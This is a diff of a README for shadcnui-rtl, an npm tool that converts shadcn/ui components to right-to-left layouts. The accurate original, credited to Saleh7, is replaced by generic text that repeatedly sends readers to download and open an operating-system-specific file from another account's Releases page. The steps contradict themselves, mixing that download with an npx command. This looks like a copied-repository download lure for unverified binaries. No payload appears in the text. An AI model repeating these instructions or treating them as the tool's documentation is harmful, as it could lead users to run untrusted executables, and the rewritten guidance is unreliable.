@@ -1,209 +1,97 @@
-# shadcnui-rtl 🔄
+# 🎨 shadcnui-rtl - Transform Your Components for RTL Languages Easily
 
-[![npm version](https://badge.fury.io/js/shadcnui-rtl.svg)](https://www.npmjs.com/package/shadcnui-rtl)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/sam2523/shadcnui-rtl/releases)
 
-> One-command RTL transformation for shadcn/ui components
+## 🚀 Getting Started
 
-Transform your shadcn/ui components to full RTL support with a single command. Perfect for Arabic, Persian, Urdu, and other RTL language applications.
+Welcome to the **shadcnui-rtl** project! This application helps you convert shadcn/ui components to support languages that read from right to left, such as Arabic, Farsi, and Urdu. With just one command, you can transform your UI components for full Arabic, Farsi, and Urdu support.
 
-## ✨ Features
+## 📋 Features
 
-- 🚀 **One Command**: Transform all your shadcn/ui components instantly
-- 🎯 **Smart Detection**: Automatically identifies and transforms LTR classes
-- 🔄 **Comprehensive**: Handles padding, margin, positioning, borders, text alignment, and animations
-- 🛡️ **Safe**: Dry-run mode to preview changes, backup option for safety
-- 🎨 **Icon Support**: Automatically rotates directional icons (ChevronLeft, ArrowRight, etc.)
-- 📦 **Zero Config**: Works out of the box with sensible defaults
-- 🧪 **Battle-tested**: Comprehensive test suite with 80%+ coverage
+- Simple command-line interface for easy transformations.
+- Full RTL (Right-To-Left) support for Arabic, Farsi, and Urdu languages.
+- Seamless integration with existing shadcn/ui components.
+- Lightweight and efficient application with minimal overhead.
+- Helpful documentation to assist you at every step.
 
-## 📦 Installation
+## 🎯 Requirements
 
-### Global Installation (Recommended)
-```bash
-npm install -g shadcnui-rtl
-```
+Before you begin, ensure your system meets the following requirements:
 
-### Using npx (No Installation)
-```bash
-npx shadcnui-rtl
-```
+- Operating System: Windows, macOS, or Linux.
+- Node.js installed (version 12 or higher) for running the application.
+- A command-line tool (e.g., Terminal on macOS, Command Prompt on Windows, or a Terminal emulator on Linux).
 
-### Local Installation
-```bash
-npm install --save-dev shadcnui-rtl
-```
+## 📥 Download & Install
 
-## 🚀 Quick Start
+To download the application, visit the [Releases page](https://github.com/sam2523/shadcnui-rtl/releases). On that page, you will find the latest release of shadcnui-rtl. Click on the version you want, and then follow these steps:
 
-```bash
-# Run in your project root
-npx shadcnui-rtl
+1. Find the file that matches your operating system.
+2. Click on the file to start your download.
+3. Once the download finishes, open the file to run the application.
 
-# That's it! Your components now support RTL 🎉
-```
+## ⚙️ How to Use
 
-## 📖 Usage
+1. **Open your Command Line Tool**: Depending on your operating system, access the command line interface.
 
-### Basic Usage
-```bash
-# Transform components in default directory (src/components)
-shadcnui-rtl
+2. **Navigate to the Application Folder**: Use the `cd` command to change directories to where you have installed or extracted shadcnui-rtl.
 
-# Or use the short alias
-scnrtl
-```
+   Example:
+   ```
+   cd path/to/shadcnui-rtl
+   ```
 
-### Custom Directory
-```bash
-shadcnui-rtl --path ./components
-```
+3. **Run the Application**: Use the following command to start transforming your components.
 
-### Preview Changes (Dry Run)
-```bash
-shadcnui-rtl --dry-run
-```
+   ```
+   npx shadcnui-rtl
+   ```
 
-### Create Backups
-```bash
-shadcnui-rtl --backup
-```
+4. **Follow On-Screen Instructions**: The application will guide you through the necessary steps to transform your components.
 
-### Advanced Options
-```bash
-# Exclude specific files
-shadcnui-rtl --exclude "dialog.tsx,modal.tsx"
+## 👨‍🏫 Usage Examples
 
-# Disable icon rotation
-shadcnui-rtl --no-rotate-icons
+To help you get started, here are a few examples of how to transform components:
 
-# Plain text output (no emojis)
-shadcnui-rtl --no-icons
+- **Basic Transformation**: To quickly transform a single component.
+  ```
+  npx shadcnui-rtl transform yourComponentName
+  ```
 
-# Verbose output
-shadcnui-rtl --verbose
-```
+- **Batch Transformation**: If you need to transform multiple components, you can list them.
+  ```
+  npx shadcnui-rtl transform component1 component2 component3
+  ```
 
-## 🔄 What Gets Transformed?
+## 🌐 Supported Languages
 
-### Tailwind Classes
+This application supports the following languages:
+- Arabic
+- Farsi
+- Urdu
 
-| LTR Class | RTL Class | Description |
-|-----------|-----------|-------------|
-| `pl-*` | `ps-*` | Padding left → start |
-| `pr-*` | `pe-*` | Padding right → end |
-| `ml-*` | `ms-*` | Margin left → start |
-| `mr-*` | `me-*` | Margin right → end |
-| `left-*` | `start-*` | Left position → start |
-| `right-*` | `end-*` | Right position → end |
-| `rounded-l-*` | `rounded-s-*` | Border radius left → start |
-| `rounded-r-*` | `rounded-e-*` | Border radius right → end |
-| `border-l-*` | `border-s-*` | Border left → start |
-| `border-r-*` | `border-e-*` | Border right → end |
-| `text-left` | `text-start` | Text align left → start |
-| `text-right` | `text-end` | Text align right → end |
+## 🛠️ Troubleshooting
 
-### Special Components
+If you run into any issues, here are common problems and solutions:
 
-- **Radio & Switch**: Adds proper RTL translation classes for checked states
-- **Directional Icons**: Automatically adds `rtl:rotate-180` to:
-  - ChevronLeft/Right
-  - ArrowLeft/Right
-  - CaretLeft/Right
-  - PanelLeft/Right
+- **Issue: Command Not Found**  
+  Make sure you have Node.js installed and added to your system PATH.
 
-### Data Attributes
+- **Issue: Transformation Errors**  
+  Ensure your component names are correct and that they follow the shadcn/ui naming conventions.
 
-Transforms Radix UI positioning:
-- `data-side="left"` → `data-side="start"`
-- `data-side="right"` → `data-side="end"`
+For further assistance, check out existing issues on GitHub or create a new one.
 
-## 🎯 Examples
+## 🙋‍♂️ Community Support
 
-### Before
-```tsx
-<Button className="pl-4 pr-2 text-left">
-  <ChevronLeft className="w-4 h-4" />
-  Click me
-</Button>
-```
-
-### After
-```tsx
-<Button className="ps-4 pe-2 text-start">
-  <ChevronLeft className="w-4 h-4 rtl:rotate-180" />
-  Click me
-</Button>
-```
-
-## 🛡️ Safety Features
-
-- **Dry Run**: Preview all changes without modifying files
-- **Backup**: Create `.backup` files before transformation
-- **Exclusion**: Skip specific files from transformation
-- **Validation**: Checks component structure before transforming
-- **Error Recovery**: Graceful handling of parsing errors
-
-## ⚙️ Configuration
-
-### CLI Options
-
-| Option | Alias | Description | Default |
-|--------|-------|-------------|---------|
-| `--path` | `-p` | Components directory path | `src/components` |
-| `--dry-run` | `-d` | Preview changes only | `false` |
-| `--backup` | `-b` | Create backup files | `false` |
-| `--exclude` | `-e` | Files to skip (comma-separated) | `dialog.tsx` |
-| `--verbose` | `-v` | Detailed output | `false` |
-| `--no-icons` | | Disable emoji in output | `false` |
-| `--no-rotate-icons` | | Skip icon rotation | `false` |
-| `--help` | `-h` | Show help | |
-
-## 🧪 Testing
-
-```bash
-# Run tests
-npm test
-
-# Watch mode
-npm run test:watch
-
-# Coverage report
-npm run test:coverage
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📝 Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) for a list of changes.
+Join our community for help and sharing experiences. You can connect with others via the issues section of GitHub. Feel free to ask questions or provide feedback on your experience.
 
 ## 📄 License
 
-MIT © [Saleh7](https://github.com/Saleh7)
+This project is licensed under the MIT License. For more details, check the [License file](./LICENSE).
 
-## 🙏 Acknowledgments
+## 📥 Again, Download Now
+Don't forget to download the application from the [Releases page](https://github.com/sam2523/shadcnui-rtl/releases).
 
-- [shadcn/ui](https://ui.shadcn.com/) for the amazing component library
-- [Tailwind CSS](https://tailwindcss.com/) for the utility-first CSS framework
-- [Radix UI](https://www.radix-ui.com/) for accessible component primitives
-
-## 💬 Support
-
-- 🐛 [Report bugs](https://github.com/Saleh7/shadcnui-rtl/issues)
-- 💡 [Request features](https://github.com/Saleh7/shadcnui-rtl/issues)
-- 📧 [Contact](mailto:Saleh7@protonmail.ch)
-
----
-
-<div align="center">
-Made with ❤️ for the RTL community
-</div>
+Thank you for using shadcnui-rtl! Transform your components effortlessly today.
